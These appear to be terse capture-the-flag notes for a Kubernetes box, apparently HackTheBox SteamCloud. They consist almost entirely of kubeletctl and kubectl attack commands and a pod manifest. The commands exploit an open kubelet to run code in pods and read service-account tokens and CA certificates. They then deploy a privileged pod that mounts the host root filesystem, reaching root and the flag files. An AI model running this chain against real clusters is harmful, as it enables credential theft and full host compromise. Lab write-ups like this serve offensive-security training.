
```bash
export token="SKDVSIvisdvsV" <---- some like this scroll down for info
kubeletctl pods --server 10.10.11.133
kubeletctl scan TOKEN_HERE --server 123.123.123.123
kubeletctl scan TOKEN_HERE --server $ip
kubeletctl scan rce --server $ip
kubeletctl run "ls /" --namespace kube-system --pod kube-scheduler-steamcloud --container kube-scheduler --server $ip
kubeletctl run "ls /" --namespace default --pod nginx --container nginx --server $ip
kubeletctl --server $ip exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx > token
kubeletctl --server $ip exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx > ca.crt
kubectl
kubectl --token=$token --certificate-authoity=ca.crt --server=https://$ip:8443 get pods
kubectl --token=$token --certificate-authority=ca.crt --server=https://$ip:8443 get pods
kubectl --token=$token --certificate-authority=ca.crt --server=https://$ip:8443 auth can-i --list
kubectl --token=$token --certificate-authority=ca.crt --server=https://$ip:8443 apply -f f.yaml
kubectl --token=$token --certificate-authority=ca.crt --server=https://$ip:8443 get pods
kubeletctl --server $ip exec "cat /root/home/user/user.txt" -p nginxt -c nginxt
kubeletctl --server $ip exec "cat /root/root/root.txt" -p nginxt -c nginxt
```
##### yaml file
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: nginxt
  namespace: default
spec:
  containers:
  - name: nginxt
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```